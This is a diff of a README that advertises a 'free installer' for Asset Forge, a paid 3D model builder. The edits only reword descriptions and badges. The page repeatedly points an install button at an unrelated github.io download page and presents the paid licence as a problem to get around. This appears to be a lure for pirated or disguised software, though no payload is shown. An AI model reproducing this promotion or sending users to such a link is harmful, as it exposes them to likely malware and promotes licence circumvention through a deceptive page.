@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-3D+Asset+Creation-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-3D+Asset+Creator-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Asset Forge Free Installer** — Asset Forge is a cross-platform 3D and 2D asset creation tool that lets game developers quickly assemble models from a library of modular blocks. Works without internet access, no account required. Full offline installation.
+**💻 Asset Forge Free Installer** — Asset Forge is a 3D model builder for Windows, macOS, and Linux that lets users combine pre-made blocks and pieces to create game-ready 3D assets without modeling experience. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Asset Forge](https://img.shields.io/badge/⬇_Install_Asset%20Forge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Asset Forge](https://img.shields.io/badge/⬇_Install_Asset+Forge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Asset Forge
 
-Asset Forge is a cross-platform 3D and 2D asset creation tool that lets game developers quickly assemble models from a library of modular blocks. It exports to all major formats and allows creating buildings, vehicles, and props without 3D modeling knowledge.
+Asset Forge is a 3D model builder for Windows, macOS, and Linux that lets users combine pre-made blocks and pieces to create game-ready 3D assets without modeling experience. With hundreds of included parts and support for importing custom blocks, Asset Forge can quickly generate buildings, vehicles, characters, and props for use in game engines like Unity and Unreal.
 
 ---
 
 ## ❌ Problem: Asset Forge is hard to access
 
-- **Paid License** — Requires purchase
-- **Block-Based Limitation** — Complex organic models difficult to create with modular blocks
-- **Asset Library Cost** — Full block library requires purchasing additional packs
-- **Beginner to Intermediate** — Limited toolset for advanced 3D artists needing custom geometry
+- **Block-Based Limitation** — Complex organic shapes are difficult or impossible to create
+- **Commercial License** — Paid software with additional paid asset packs
+- **Custom Blocks** — Creating custom block sets requires basic 3D modeling skills
+- **Polygon Optimization** — Generated assets may need optimization for performance-sensitive projects
 
 ---
 
@@ -81,7 +81,7 @@ Asset Forge is a cross-platform 3D and 2D asset creation tool that lets game dev
 
 <div align="center">
 
-[![⬇ Install Asset Forge](https://img.shields.io/badge/⬇_Install_Asset%20Forge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Asset Forge](https://img.shields.io/badge/⬇_Install_Asset+Forge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Asset Forge is a cross-platform 3D and 2D asset creation tool that lets game dev
 
 ---
 
-**Asset Forge Free Installer** — Asset Forge is a cross-platform 3D and 2D asset creation tool that lets game developers quickly assemble models from a library of modular blocks. Install without internet connection today!
+**Asset Forge Free Installer** — Asset Forge is a 3D model builder for Windows, macOS, and Linux that lets users combine pre-made blocks and pieces to create game-ready 3D assets without modeling experience. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Asset Forge](https://img.shields.io/badge/⬇_Install_Asset%20Forge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Asset Forge](https://img.shields.io/badge/⬇_Install_Asset+Forge-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
